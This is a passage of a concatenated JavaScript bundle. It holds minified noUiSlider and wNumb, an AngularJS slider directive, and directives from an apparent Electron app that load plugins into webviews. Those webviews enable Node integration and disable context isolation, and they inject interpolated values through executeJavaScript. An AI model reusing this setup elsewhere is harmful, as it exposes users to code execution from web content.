ertical",marker:"marker",markerHorizontal:"marker-horizontal",markerVertical:"marker-vertical",markerNormal:"marker-normal",markerLarge:"marker-large",markerSub:"marker-sub",value:"value",valueHorizontal:"value-horizontal",valueVertical:"value-vertical",valueNormal:"value-normal",valueLarge:"value-large",valueSub:"value-sub"}};e.format&&!e.ariaFormat&&(e.ariaFormat=e.format),Object.keys(n).forEach(function(t){if(!s(e[t])&&void 0===i[t]){if(n[t].r)throw new Error("noUiSlider ("+lt+"): '"+t+"' is required.");return!0}n[t].t(r,s(e[t])?e[t]:i[t])}),r.pips=e.pips;var t=document.createElement("div"),o=void 0!==t.style.msTransform,a=void 0!==t.style.transform;r.transformRule=a?"transform":o?"msTransform":"webkitTransform";return r.style=[["left","top"],["right","bottom"]][r.dir][r.ort],r}function D(t,v,o){var l,u,a,c,i,s,e,p,f=window.navigator.pointerEnabled?{start:"pointerdown",move:"pointermove",end:"pointerup"}:window.navigator.msPointerEnabled?{start:"MSPointerDown",move:"MSPointerMove",end:"MSPointerUp"}:{start:"mousedown touchstart",move:"mousemove touchmove",end:"mouseup touchend"},d=window.CSS&&CSS.supports&&CSS.supports("touch-action","none")&&function(){var t=!1;try{var e=Object.defineProperty({},"passive",{get:function(){t=!0}});window.addEventListener("test",null,e)}catch(t){}return t}(),h=t,y=v.spectrum,b=[],S=[],m=[],g=0,x={},w=t.ownerDocument,E=v.documentElement||w.documentElement,C=w.body,N=-1,U=0,P=1,V=2,k="rtl"===w.dir||1===v.ort?0:100;function A(t,e){var r=w.createElement("div");return e&&ht(r,e),t.appendChild(r),r}function M(t,e){var r=A(t,v.cssClasses.origin),n=A(r,v.cssClasses.handle);return A(n,v.cssClasses.touchArea),n.setAttribute("data-handle",e),v.keyboardSupport&&(n.setAttribute("tabindex","0"),n.addEventListener("keydown",function(t){return function(t,e){if(L()||D(e))return!1;var r=["Left","Right"],n=["Down","Up"],i=["PageDown","PageUp"],o=["Home","End"];v.dir&&!v.ort?r.reverse():v.ort&&!v.dir&&(n.reverse(),i.reverse());var a,s=t.key.replace("Arrow",""),l=s===i[0],u=s===i[1],c=s===n[0]||s===r[0]||l,p=s===n[1]||s===r[1]||u,f=s===o[0],d=s===o[1];if(!(c||p||f||d))return!0;if(t.preventDefault(),p||c){var h=c?0:1,m=st(e),g=m[h];if(null===g)return!1;!1===g&&(g=y.getDefaultStep(S[e],c,10)),(u||l)&&(g*=5),g=Math.max(g,1e-7),g*=c?-1:1,a=b[e]+g}else a=d?v.spectrum.xVal[v.spectrum.xVal.length-1]:v.spectrum.xVal[0];return rt(e,y.toStepping(a),!0,!0),J("slide",e),J("update",e),J("change",e),J("set",e),!1}(t,e)})),n.setAttribute("role","slider"),n.setAttribute("aria-orientation",v.ort?"vertical":"horizontal"),0===e?ht(n,v.cssClasses.handleLower):e===v.handles-1&&ht(n,v.cssClasses.handleUpper),r}function O(t,e){return!!e&&A(t,v.cssClasses.connect)}function r(t,e){return!!v.tooltips[e]&&A(t.firstChild,v.cssClasses.tooltip)}function L(){return h.hasAttribute("disabled")}function D(t){return u[t].hasAttribute("disabled")}function z(){i&&(G("update.tooltips"),i.forEach(function(t){t&&ut(t)}),i=null)}function H(){z(),i=u.map(r),$("update.tooltips",function(t,e,r){if(i[e]){var n=t[e];!0!==v.tooltips[e]&&(n=v.tooltips[e].to(r[e])),i[e].innerHTML=n}})}function j(e,i,o){var a=w.createElement("div"),s=[];s[U]=v.cssClasses.valueNormal,s[P]=v.cssClasses.valueLarge,s[V]=v.cssClasses.valueSub;var l=[];l[U]=v.cssClasses.markerNormal,l[P]=v.cssClasses.markerLarge,l[V]=v.cssClasses.markerSub;var u=[v.cssClasses.valueHorizontal,v.cssClasses.valueVertical],c=[v.cssClasses.markerHorizontal,v.cssClasses.markerVertical];function p(t,e){var r=e===v.cssClasses.value,n=r?s:l;return e+" "+(r?u:c)[v.ort]+" "+n[t]}return ht(a,v.cssClasses.pips),ht(a,0===v.ort?v.cssClasses.pipsHorizontal:v.cssClasses.pipsVertical),Object.keys(e).forEach(function(t){!function(t,e,r){if((r=i?i(e,r):r)!==N){var n=A(a,!1);n.className=p(r,v.cssClasses.marker),n.style[v.style]=t+"%",U<r&&((n=A(a,!1)).className=p(r,v.cssClasses.value),n.setAttribute("data-value",e),n.style[v.style]=t+"%",n.innerHTML=o.to(e))}}(t,e[t][0],e[t][1])}),a}function F(){c&&(ut(c),c=null)}function R(t){F();var m,g,v,b,e,r,S,x,w,n=t.mode,i=t.density||1,o=t.filter||!1,a=function(t,e,r){if("range"===t||"steps"===t)return y.xVal;if("count"===t){if(e<2)throw new Error("noUiSlider ("+lt+"): 'values' (>= 2) required for mode 'count'.");var n=e-1,i=100/n;for(e=[];n--;)e[n]=n*i;e.push(100),t="positions"}return"positions"===t?e.map(function(t){return y.fromStepping(r?y.getStep(t):t)}):"values"===t?r?e.map(function(t){return y.fromStepping(y.getStep(y.toStepping(t)))}):e:void 0}(n,t.values||!1,t.stepped||!1),s=(m=i,g=n,v=a,b={},e=y.xVal[0],r=y.xVal[y.xVal.length-1],x=S=!1,w=0,(v=v.slice().sort(function(t,e){return t-e}).filter(function(t){return!this[t]&&(this[t]=!0)},{}))[0]!==e&&(v.unshift(e),S=!0),v[v.length-1]!==r&&(v.push(r),x=!0),v.forEach(function(t,e){var r,n,i,o,a,s,l,u,c,p,f=t,d=v[e+1],h="steps"===g;if(h&&(r=y.xNumSteps[e]),r||(r=d-f),!1!==f&&void 0!==d)for(r=Math.max(r,1e-7),n=f;n<=d;n=(n+r).toFixed(7)/1){for(u=(a=(o=y.toStepping(n))-w)/m,p=a/(c=Math.round(u)),i=1;i<=c;i+=1)b[(s=w+i*p).toFixed(5)]=[y.fromStepping(s),0];l=-1<v.indexOf(n)?P:h?V:U,!e&&S&&(l=0),n===d&&x||(b[o.toFixed(5)]=[n,l]),w=o}}),b),l=t.format||{to:Math.round};return c=h.appendChild(j(s,o,l))}function T(){var t=l.getBoundingClientRect(),e="offset"+["Width","Height"][v.ort];return 0===v.ort?t.width||l[e]:t.height||l[e]}function B(n,i,o,a){var e=function(t){return!!(t=function(t,e,r){var n,i,o=0===t.type.indexOf("touch"),a=0===t.type.indexOf("mouse"),s=0===t.type.indexOf("pointer");0===t.type.indexOf("MSPointer")&&(s=!0);if(o){var l=function(t){return t.target===r||r.contains(t.target)};if("touchstart"===t.type){var u=Array.prototype.filter.call(t.touches,l);if(1<u.length)return!1;n=u[0].pageX,i=u[0].pageY}else{var c=Array.prototype.find.call(t.changedTouches,l);if(!c)return!1;n=c.pageX,i=c.pageY}}e=e||gt(w),(a||s)&&(n=t.clientX+e.x,i=t.clientY+e.y);return t.pageOffset=e,t.points=[n,i],t.cursor=a||s,t}(t,a.pageOffset,a.target||i))&&(!(L()&&!a.doNotReject)&&(e=h,r=v.cssClasses.tap,!((e.classList?e.classList.contains(r):new RegExp("\\b"+r+"\\b").test(e.className))&&!a.doNotReject)&&(!(n===f.start&&void 0!==t.buttons&&1<t.buttons)&&((!a.hover||!t.buttons)&&(d||t.preventDefault(),t.calcPoint=t.points[v.ort],void o(t,a))))));var e,r},r=[];return n.split(" ").forEach(function(t){i.addEventListener(t,e,!!d&&{passive:!0}),r.push([t,e])}),r}function q(t){var e,r,n,i,o,a,s=100*(t-(e=l,r=v.ort,n=e.getBoundingClientRect(),i=e.ownerDocument,o=i.documentElement,a=gt(i),/webkit.*Chrome.*Mobile/i.test(navigator.userAgent)&&(a.x=0),r?n.top+a.y-o.clientTop:n.left+a.x-o.clientLeft))/T();return s=ft(s),v.dir?100-s:s}function X(t,e){"mouseout"===t.type&&"HTML"===t.target.nodeName&&null===t.relatedTarget&&_(t,e)}function Y(t,e){if(-1===navigator.appVersion.indexOf("MSIE 9")&&0===t.buttons&&0!==e.buttonsProperty)return _(t,e);var r=(v.dir?-1:1)*(t.calcPoint-e.startCalcPoint);Z(0<r,100*r/e.baseSize,e.locations,e.handleNumbers)}function _(t,e){e.handle&&(mt(e.handle,v.cssClasses.active),g-=1),e.listeners.forEach(function(t){E.removeEventListener(t[0],t[1])}),0===g&&(mt(h,v.cssClasses.drag),et(),t.cursor&&(C.style.cursor="",C.removeEventListener("selectstart",ct))),e.handleNumbers.forEach(function(t){J("change",t),J("set",t),J("end",t)})}function I(t,e){if(e.handleNumbers.some(D))return!1;var r;1===e.handleNumbers.length&&(r=u[e.handleNumbers[0]].children[0],g+=1,ht(r,v.cssClasses.active));t.stopPropagation();var n=[],i=B(f.move,E,Y,{target:t.target,handle:r,listeners:n,startCalcPoint:t.calcPoint,baseSize:T(),pageOffset:t.pageOffset,handleNumbers:e.handleNumbers,buttonsProperty:t.buttons,locations:S.slice()}),o=B(f.end,E,_,{target:t.target,handle:r,listeners:n,doNotReject:!0,handleNumbers:e.handleNumbers}),a=B("mouseout",E,X,{target:t.target,handle:r,listeners:n,doNotReject:!0,handleNumbers:e.handleNumbers});n.push.apply(n,i.concat(o,a)),t.cursor&&(C.style.cursor=getComputedStyle(t.target).cursor,1<u.length&&ht(h,v.cssClasses.drag),C.addEventListener("selectstart",ct,!1)),e.handleNumbers.forEach(function(t){J("start",t)})}function n(t){t.stopPropagation();var i,o,a,e=q(t.calcPoint),r=(i=e,a=!(o=100),u.forEach(function(t,e){if(!D(e)){var r=S[e],n=Math.abs(r-i);(n<o||n<=o&&r<i||100===n&&100===o)&&(a=e,o=n)}}),a);if(!1===r)return!1;v.events.snap||pt(h,v.cssClasses.tap,v.animationDuration),rt(r,e,!0,!0),et(),J("slide",r,!0),J("update",r,!0),J("change",r,!0),J("set",r,!0),v.events.snap&&I(t,{handleNumbers:[r]})}function W(t){var e=q(t.calcPoint),r=y.getStep(e),n=y.fromStepping(r);Object.keys(x).forEach(function(t){"hover"===t.split(".")[0]&&x[t].forEach(function(t){t.call(s,n)})})}function $(t,e){x[t]=x[t]||[],x[t].push(e),"update"===t.split(".")[0]&&u.forEach(function(t,e){J("update",e)})}function G(t){var n=t&&t.split(".")[0],i=n&&t.substring(n.length);Object.keys(x).forEach(function(t){var e=t.split(".")[0],r=t.substring(e.length);n&&n!==e||i&&i!==r||delete x[t]})}function J(r,n,i){Object.keys(x).forEach(function(t){var e=t.split(".")[0];r===e&&x[t].forEach(function(t){t.call(s,b.map(v.format.to),n,b.slice(),i||!1,S.slice())})})}function K(t,e,r,n,i,o){return 1<u.length&&!v.events.unconstrained&&(n&&0<e&&(r=Math.max(r,t[e-1]+v.margin)),i&&e<u.length-1&&(r=Math.min(r,t[e+1]-v.margin))),1<u.length&&v.limit&&(n&&0<e&&(r=Math.min(r,t[e-1]+v.limit)),i&&e<u.length-1&&(r=Math.max(r,t[e+1]-v.limit))),v.padding&&(0===e&&(r=Math.max(r,v.padding[0])),e===u.length-1&&(r=Math.min(r,100-v.padding[1]))),!((r=ft(r=y.getStep(r)))===t[e]&&!o)&&r}function Q(t,e){var r=v.ort;return(r?e:t)+", "+(r?t:e)}function Z(t,n,r,e){var i=r.slice(),o=[!t,t],a=[t,!t];e=e.slice(),t&&e.reverse(),1<e.length?e.forEach(function(t,e){var r=K(i,t,i[t]+n,o[e],a[e],!1);!1===r?n=0:(n=r-i[t],i[t]=r)}):o=a=[!0];var s=!1;e.forEach(function(t,e){s=rt(t,r[t]+n,o[e],a[e])||s}),s&&e.forEach(function(t){J("update",t),J("slide",t)})}function tt(t,e){return v.dir?100-t-e:t}function et(){m.forEach(function(t){var e=50<S[t]?-1:1,r=3+(u.length+e*t);u[t].style.zIndex=r})}function rt(t,e,r,n){return!1!==(e=K(S,t,e,r,n,!1))&&(function(t,e){S[t]=e,b[t]=y.fromStepping(e);var r="translate("+Q(10*(tt(e,0)-k)+"%","0")+")";u[t].style[v.transformRule]=r,nt(t),nt(t+1)}(t,e),!0)}function nt(t){if(a[t]){var e=0,r=100;0!==t&&(e=S[t-1]),t!==a.length-1&&(r=S[t]);var n=r-e,i="translate("+Q(tt(e,n)+"%","0")+")",o="scale("+Q(n/100,"1")+")";a[t].style[v.transformRule]=i+" "+o}}function it(t,e){return null===t||!1===t||void 0===t?S[e]:("number"==typeof t&&(t=String(t)),t=v.format.from(t),!1===(t=y.toStepping(t))||isNaN(t)?S[e]:t)}function ot(t,e){var r=dt(t),n=void 0===S[0];e=void 0===e||!!e,v.animate&&!n&&pt(h,v.cssClasses.tap,v.animationDuration),m.forEach(function(t){rt(t,it(r[t],t),!0,!1)});for(var i=1===m.length?0:1;i<m.length;++i)m.forEach(function(t){rt(t,S[t],!0,!0)});et(),m.forEach(function(t){J("update",t),null!==r[t]&&e&&J("set",t)})}function at(){var t=b.map(v.format.to);return 1===t.length?t[0]:t}function st(t){var e=S[t],r=y.getNearbySteps(e),n=b[t],i=r.thisStep.step,o=null;if(v.snap)return[n-r.stepBefore.startValue||null,r.stepAfter.startValue-n||null];!1!==i&&n+i>r.stepAfter.startValue&&(i=r.stepAfter.startValue-n),o=n>r.thisStep.startValue?r.thisStep.step:!1!==r.stepBefore.step&&n-r.stepBefore.highestStep,100===e?i=null:0===e&&(o=null);var a=y.countStepDecimals();return null!==i&&!1!==i&&(i=Number(i.toFixed(a))),null!==o&&!1!==o&&(o=Number(o.toFixed(a))),[o,i]}return ht(e=h,v.cssClasses.target),0===v.dir?ht(e,v.cssClasses.ltr):ht(e,v.cssClasses.rtl),0===v.ort?ht(e,v.cssClasses.horizontal):ht(e,v.cssClasses.vertical),ht(e,"rtl"===getComputedStyle(e).direction?v.cssClasses.textDirectionRtl:v.cssClasses.textDirectionLtr),l=A(e,v.cssClasses.base),function(t,e){var r=A(e,v.cssClasses.connects);u=[],(a=[]).push(O(r,t[0]));for(var n=0;n<v.handles;n++)u.push(M(e,n)),m[n]=n,a.push(O(r,t[n+1]))}(v.connect,l),(p=v.events).fixed||u.forEach(function(t,e){B(f.start,t.children[0],I,{handleNumbers:[e]})}),p.tap&&B(f.start,l,n,{}),p.hover&&B(f.move,l,W,{hover:!0}),p.drag&&a.forEach(function(t,e){if(!1!==t&&0!==e&&e!==a.length-1){var r=u[e-1],n=u[e],i=[t];ht(t,v.cssClasses.draggable),p.fixed&&(i.push(r.children[0]),i.push(n.children[0])),i.forEach(function(t){B(f.start,t,I,{handles:[r,n],handleNumbers:[e-1,e]})})}}),ot(v.start),v.pips&&R(v.pips),v.tooltips&&H(),$("update",function(t,e,a,r,s){m.forEach(function(t){var e=u[t],r=K(S,t,0,!0,!0,!0),n=K(S,t,100,!0,!0,!0),i=s[t],o=v.ariaFormat.to(a[t]);r=y.fromStepping(r).toFixed(1),n=y.fromStepping(n).toFixed(1),i=y.fromStepping(i).toFixed(1),e.children[0].setAttribute("aria-valuemin",r),e.children[0].setAttribute("aria-valuemax",n),e.children[0].setAttribute("aria-valuenow",i),e.children[0].setAttribute("aria-valuetext",o)})}),s={destroy:function(){for(var t in v.cssClasses)v.cssClasses.hasOwnProperty(t)&&mt(h,v.cssClasses[t]);for(;h.firstChild;)h.removeChild(h.firstChild);delete h.noUiSlider},steps:function(){return m.map(st)},on:$,off:G,get:at,set:ot,setHandle:function(t,e,r){if(!(0<=(t=Number(t))&&t<m.length))throw new Error("noUiSlider ("+lt+"): invalid handle number, got: "+t);rt(t,it(e,t),!0,!0),J("update",t),r&&J("set",t)},reset:function(t){ot(v.start,t)},__moveHandles:function(t,e,r){Z(t,e,S,r)},options:o,updateOptions:function(e,t){var r=at(),n=["margin","limit","padding","range","animate","snap","step","format","pips","tooltips"];n.forEach(function(t){void 0!==e[t]&&(o[t]=e[t])});var i=vt(o);n.forEach(function(t){void 0!==e[t]&&(v[t]=i[t])}),y=i.spectrum,v.margin=i.margin,v.limit=i.limit,v.padding=i.padding,v.pips?R(v.pips):F(),v.tooltips?H():z(),S=[],ot(e.start||r,t)},target:h,removePips:F,removeTooltips:z,pips:R}}return{__spectrum:l,version:lt,create:function(t,e){if(!t||!t.nodeName)throw new Error("noUiSlider ("+lt+"): create requires a single element, got: "+t);if(t.noUiSlider)throw new Error("noUiSlider ("+lt+"): Slider was already initialized.");var r=D(t,vt(e),e);return t.noUiSlider=r}}});

!function(e){"function"==typeof define&&define.amd?define([],e):"object"==typeof exports?module.exports=e():window.wNumb=e()}(function(){"use strict";var o=["decimals","thousand","mark","prefix","suffix","encoder","decoder","negativeBefore","negative","edit","undo"];function w(e){return e.split("").reverse().join("")}function h(e,t){return e.substring(0,t.length)===t}function f(e,t,n){if((e[t]||e[n])&&e[t]===e[n])throw new Error(t)}function x(e){return"number"==typeof e&&isFinite(e)}function n(e,t,n,r,i,o,f,u,s,c,a,p){var d,l,h,g=p,v="",m="";return o&&(p=o(p)),!!x(p)&&(!1!==e&&0===parseFloat(p.toFixed(e))&&(p=0),p<0&&(d=!0,p=Math.abs(p)),!1!==e&&(p=function(e,t){return e=e.toString().split("e"),(+((e=(e=Math.round(+(e[0]+"e"+(e[1]?+e[1]+t:t)))).toString().split("e"))[0]+"e"+(e[1]?e[1]-t:-t))).toFixed(t)}(p,e)),-1!==(p=p.toString()).indexOf(".")?(h=(l=p.split("."))[0],n&&(v=n+l[1])):h=p,t&&(h=w((h=w(h).match(/.{1,3}/g)).join(w(t)))),d&&u&&(m+=u),r&&(m+=r),d&&s&&(m+=s),m+=h,m+=v,i&&(m+=i),c&&(m=c(m,g)),m)}function r(e,t,n,r,i,o,f,u,s,c,a,p){var d,l="";return a&&(p=a(p)),!(!p||"string"!=typeof p)&&(u&&h(p,u)&&(p=p.replace(u,""),d=!0),r&&h(p,r)&&(p=p.replace(r,"")),s&&h(p,s)&&(p=p.replace(s,""),d=!0),i&&function(e,t){return e.slice(-1*t.length)===t}(p,i)&&(p=p.slice(0,-1*i.length)),t&&(p=p.split(t).join("")),n&&(p=p.replace(n,".")),d&&(l+="-"),""!==(l=(l+=p).replace(/[^0-9\.\-.]/g,""))&&(l=Number(l),f&&(l=f(l)),!!x(l)&&l))}function i(e,t,n){var r,i=[];for(r=0;r<o.length;r+=1)i.push(e[o[r]]);return i.push(n),t.apply("",i)}return function e(t){if(!(this instanceof e))return new e(t);"object"==typeof t&&(t=function(e){var t,n,r,i={};for(void 0===e.suffix&&(e.suffix=e.postfix),t=0;t<o.length;t+=1)if(void 0===(r=e[n=o[t]]))"negative"!==n||i.negativeBefore?"mark"===n&&"."!==i.thousand?i[n]=".":i[n]=!1:i[n]="-";else if("decimals"===n){if(!(0<=r&&r<8))throw new Error(n);i[n]=r}else if("encoder"===n||"decoder"===n||"edit"===n||"undo"===n){if("function"!=typeof r)throw new Error(n);i[n]=r}else{if("string"!=typeof r)throw new Error(n);i[n]=r}return f(i,"mark","thousand"),f(i,"prefix","negative"),f(i,"prefix","negativeBefore"),i}(t),this.to=function(e){return i(t,n,e)},this.from=function(e){return i(t,r,e)})}});
"use strict";

angular.module('ya.nouislider', [])
  .value('yaNoUiSliderConfig', {})
  .directive('yaNoUiSlider', ['$timeout', '$log', 'yaNoUiSliderConfig', function($timeout, $log, yaNoUiSliderConfig) {
    function toArray(val) {
      return angular.isArray(val) ? val : [val];
    }

    function copy(val) {
      return toArray(val).slice();
    }

    function equals(a, b) {
      a = toArray(a);
      b = toArray(b);

      return a[0] === b[0] && a[1] === b[1];
    }

    function omit(object, property) {
      var keys = Object.keys(object),
        index = -1,
        length = keys.length,
        result = {};

      while (++index < length) {
        var key = keys[index];
        if (key !== property) {
          result[key] = object[key];
        }
      }
      return result;
    }

    return {
      restrict: 'A',
      require: 'yaNoUiSlider',
      scope: {
        yaNoUiSlider: '=',
        yaNoUiSliderDisabled: '=',
        yaNoUiSliderHandle1Disabled: '=',
        yaNoUiSliderHandle2Disabled: '=',
        yaNoUiSliderSlideDebounce: '@'
      },
      controller: ['$scope', '$element', '$attrs', function($scope, $element, $attrs) {
        var that = this,
          noUiSliderElement = $element[0],
          noUiSliderEvents = $scope.$parent.$eval($attrs.yaNoUiSliderEvents),
          slideDebounceDelay = $scope.yaNoUiSliderSlideDebounce || 0,
          events = slideDebounceDelay && slideDebounceDelay === 'Infinity' ? ['change'] : ['change', 'slide'],
          noUiSliderInstance,
          origins,
          sliderScope,
          pendingSlideDebounce;

        // allow to get noUiSlider instance from outside of that directive
        that.getNoUiSlider = function() {
          return noUiSliderInstance;
        };

        function toggleDisabled(element, newValue, oldValue) {
          if (newValue) {
            element.setAttribute('disabled', true);
          } else {
            element.removeAttribute('disabled');
          }
        }

        function destroy() {
          sliderScope.$destroy();
          noUiSliderInstance.off('slide change update slide');
          noUiSliderInstance.destroy();
          $timeout.cancel(pendingSlideDebounce);
        }

        function createSlider() {
          function updateValue(newValue) {
            var newValueCopy = copy(newValue);
            if (!equals(newValueCopy, latestValue)) {
              latestValue = newValueCopy;
              $scope.$applyAsync(function() {
                if (angular.isArray(newValue)) {
                  if (angular.isArray($scope.yaNoUiSlider.start)) {
                    $scope.yaNoUiSlider.start[0] = newValue[0];
                    $scope.yaNoUiSlider.start[1] = newValue[1];
                  } else {
                    $scope.yaNoUiSlider.start = newValue[0];
                  }
                } else {
                  $scope.yaNoUiSlider.start = newValue;
                }
              });
            }
          }

          sliderScope = $scope.$new();
          var options = angular.extend({}, yaNoUiSliderConfig, $scope.yaNoUiSlider);
          var latestValue = copy(options.start);
          options.start = copy(options.start);
          noUiSlider.create(noUiSliderElement, options);
          origins = noUiSliderElement.getElementsByClassName('noUi-origin');
          noUiSliderInstance = noUiSliderElement.noUiSlider;

          sliderScope.$watch(function() {
            var modelValue = $scope.yaNoUiSlider.start;
            if (!equals(modelValue, latestValue)) {
              latestValue = copy(modelValue);
              noUiSliderInstance.set(copy(modelValue));
            }
            return latestValue;
          });

          angular.forEach(events, function(eventName) {
            noUiSliderInstance.on(eventName + '.internal', function(values, handle, unencoded) {
              if (eventName === 'slide' && slideDebounceDelay) {
                $timeout.cancel(pendingSlideDebounce);
                pendingSlideDebounce = $timeout(function() {
                  updateValue(unencoded);
                }, slideDebounceDelay);
              } else {
                updateValue(unencoded);
              }
            });
          });

          angular.forEach(noUiSliderEvents, function (handler, event) {
            noUiSliderInstance.on(event + '.noUiSlider', function () {
              var handlerArguments = Array.prototype.slice.call(arguments);
              var self = this;
              $scope.$applyAsync(function () {
                handler.apply(self, handlerArguments);
              });
            });
          });

          sliderScope.$watch('yaNoUiSliderDisabled', toggleDisabled.bind(undefined, noUiSliderElement));
          sliderScope.$watch('yaNoUiSliderHandle1Disabled', toggleDisabled.bind(undefined, origins[0]));
          sliderScope.$watch('yaNoUiSliderHandle2Disabled', function(newValue, oldValue) {
            if (newValue && !origins[1]) {
              return $log.warn('Warning: attempt to toggle disabled state of second handle using ya-no-ui-slider-handle2-disabled attribute in one-handle slider, nouislider-angular is ignoring such call.');
            }
            if (origins[1]) {
              toggleDisabled(origins[1], newValue, oldValue);
            }
          });
        }

        function initialize() {
          $scope.$watch(function() {
            return omit($scope.yaNoUiSlider, 'start');
          }, function() {
            if (noUiSliderInstance) {
              destroy();
            }
            createSlider();
          }, true);

          $scope.$on('$destroy', destroy);
        }

        var initializeWatcher = $scope.$watch('yaNoUiSlider', function(options) {
          if (options) {
            initializeWatcher();
            initialize();
          }
        });
      }]
    }
  }]);

// 將 webview 放在全域，未來不需要重複 init webview
let pluginWebView = document.createElement('webview');
let pluginWebViewInitialized = false;

angular.module("pluginView",[]).directive('pluginView', function() {
    return {
        restrict: 'E',
        scope: {
            item: '=',
        },
        link: function(scope, element, attrs) {

            function init () {
                let webview;
                const preloadPath = URL_MODULE.pathToFileURL(path.join(appRoot.path, '/app/js/plugin/api-format-extension.js')).href;

                pluginWebView.setAttribute('preload', preloadPath);
                pluginWebView.setAttribute('allowpopups', '');
                pluginWebView.setAttribute('nodeintegration', '');
                pluginWebView.setAttribute('webpreferences', 'contextIsolation=false');
                pluginWebView.setAttribute('src', attrs.ngSrc);
                pluginWebViewInitialized = true;

                webview = pluginWebView;

                if (element.find("webview").length === 0) {
                    $(element).append(webview);
                }

                webview.addEventListener('did-fail-load', (e) => {
                    console.log(e);
                })

                webview.addEventListener('console-message', (e) => {
                    console.log(e.message)
                })

                webview.addEventListener('crash', (e) => {
                    console.log(e);  
                })

                webview.addEventListener('will-navigate', (e) => {
                    console.log(e.url);
                    if (e.url && e.url !== webview.src) {
                    }
                    else {
                        e.preventDefault();
                        e.stopPropagation();
                        webview.stop();
                        webview.reload();
                    }
                });
                pluginWebView = webview;
                webview.addEventListener('dom-ready', () => {
                    const item = scope.$parent.current;
                    const plugin = pluginModule.previewExtension.getViewerPlugin(item);
                    const allowZoom = pluginModule.previewExtension.allowZoom(item.ext);

                    let style = (allowZoom)? `
                        aspect-ratio: ${item.width / item.height};
                        max-width: 100%;
                        max-height: 100%;
                        width: ${item.width}px;
                        height: ${item.height}px;
                    ` : "";
                    pluginWebView.setAttribute('style', style);

                    try {
                        const script = `
                            window.parentID = ${currentWindow?.webContents?.id};
                            window.windowID = ${webview.getWebContentsId()};
                            window.eagle.app.theme = '${preferences?.theme?.name}';
                            window.eagle.app.version = '${pjson?.version}';
                            window.eagle.app.build = ${pjson?.buildNumber};
                            window.eagle.app.locale = '${preferences?.general?.language}';
                            window.eagle.app.runningUnderARM64Translation = ${app?.runningUnderARM64Translation};
                            window.eagle.plugin = {};
                            window.eagle.plugin.path = '${plugin.path.replace(/\\/gm, "/").replace(/'/g, "\\'")}';
                            window.eagle.plugin.path = require('path').normalize(window.eagle.plugin.path);
                            
                            window.eagle.library.path = '${$bodyScope?.libraryPath?.replace(/\\/gm, "/").replace(/'/g, "\\'")}';
                            window.eagle.library.path = require('path').normalize(window.eagle.library.path);
                            
                            try {
                                global.__dirname = eagle.plugin.path;
                                eagle.isDev = !eagle.plugin.path.includes('Eagle/Plugins') && !eagle.plugin.path.includes('Eagle\\Plugins');
                            } catch (err) {
                                console.log(err);
                            }
                        `;
                        webview.executeJavaScript(script);
                    }
                    catch (err) {
                        
                    }
                    setTimeout(() => {
                        webview.send('plugin-create', plugin);
                        webview.send('plugin-run');
                    }, 100);
                });

            }

            if (!pluginWebViewInitialized) {
                init();
            }
            else {
                if (element.find("webview").length === 0) {
                    $(element).append(pluginWebView);
                }
                pluginWebView.setAttribute('src', "");
                setTimeout(() => {
                    pluginWebView.setAttribute('src', attrs.ngSrc);
                }, 50);
            }

            attrs.$observe('ngSrc', function (val) {
                pluginWebView.setAttribute('src', attrs.ngSrc);
            });

            scope.$on('$destroy', function () {
                pluginWebView.setAttribute('src', "");
            });
        }
    };
});
angular.module("inspectorPluginView",[]).directive('inspectorPluginView', function() {
    return {
        restrict: 'E',
        scope: {
            items: '=',
            plugin: '=',
            hidePluginMap: '=',
        },
        link: function(scope, element, attrs) {

            const plugin = scope.plugin;
            let heightInterval;
            let lastPluginHeight = 0;

            function init () {
                const items = scope.items;
                const item = items[0];

                if (!item || !plugin) return;

                const webviewId = `inspector-plugin-${plugin?.manifest?.id}`;
                const $webview = $(`#${webviewId}`);
                const src = pluginModule.previewExtension.getInspectorPluginURL(plugin, item);
                const hasInspectorPlugin = pluginModule.previewExtension.hasInspectorPlugin(item);

                if (!hasInspectorPlugin) return;

                // 如果 webview 已经存在，则直接更新 src，不再重新创建
                if ($webview.length) {
                    $webview.attr('src', src);
                    return;
                }

                const height = Object.keys(plugin?.manifest?.preview).reduce((acc, key) => {
                    if (key.includes(item.ext)) {
                        return plugin?.manifest?.preview[key]?.inspector?.height || 32;
                    }
                    return acc;
                }, 100) || 32;
                const preloadPath = URL_MODULE.pathToFileURL(path.join(appRoot.path, '/app/js/plugin/api-format-extension.js')).href;
                
                let html;
                let tagName = "webview";
                html = `<${tagName} id="${webviewId}" style="height: ${height}px;" src="${src}" preload="${preloadPath}" allowpopups nodeintegration webpreferences="contextIsolation=false"></${tagName}>`;    

				let $elem = $(element).html(html);
                var webview = $elem.find("webview")[0];
                
                webview.addEventListener('did-fail-load', (e) => {
                    console.log(e);
                })

                // webview.addEventListener('console-message', (e) => {
                    // console.log(e.message)
                // })

                webview.addEventListener('crash', (e) => {
                    console.log(e);  
                })

                webview.addEventListener('will-navigate', (e) => {
                    console.log(e.url);
                    if (e.url && e.url !== webview.src) {
                    }
                    else {
                        e.preventDefault();
                        e.stopPropagation();
                        webview.stop();
                        webview.reload();
                    }
                });

                webview.addEventListener('dom-ready', () => {
                    try {
                        const script = `
                            window.parentID = ${currentWindow?.webContents?.id};
                            window.windowID = ${webview.getWebContentsId()};
                            window.eagle.app.theme = '${preferences?.theme?.name}';
                            window.eagle.app.version = '${pjson?.version}';
                            window.eagle.app.build = ${pjson?.buildNumber};
                            window.eagle.app.locale = '${preferences?.general?.language}';
                            window.eagle.app.runningUnderARM64Translation = ${app?.runningUnderARM64Translation};
                            window.eagle.library.path = '${$bodyScope.libraryPath.replace(/\\/gm, "/").replace(/'/g, "\\'")}';
                            window.eagle.library.path = require('path').normalize(window.eagle.library.path);
                            window.eagle.plugin = {};

                            window.eagle.plugin.path = '${plugin.path.replace(/\\/gm, "/").replace(/'/g, "\\'")}';
                            window.eagle.plugin.path = require('path').normalize(window.eagle.plugin.path);

                            window.eagle.library.path = '${$bodyScope?.libraryPath?.replace(/\\/gm, "/").replace(/'/g, "\\'")}';
                            window.eagle.library.path = require('path').normalize(window.eagle.library.path);
                            
                            try {
                                global.__dirname = eagle.plugin.path;
                                eagle.isDev = !eagle.plugin.path.includes('Eagle/Plugins') && !eagle.plugin.path.includes('Eagle\\Plugins');
                            } catch (err) {
                                console.log(err);
                            }
                        `;
                        webview.executeJavaScript(script);
                    }
                    catch (err) {
                        
                    }
                    setTimeout(() => {
                        try {
                            // TODO: 要取得真正的 plugin 对象
                            webview.send('plugin-create', plugin);
                            webview.send('plugin-run');
                        } catch (err) {
                        }
                    }, 100);

                    // get webview body height 
                    clearInterval(heightInterval);
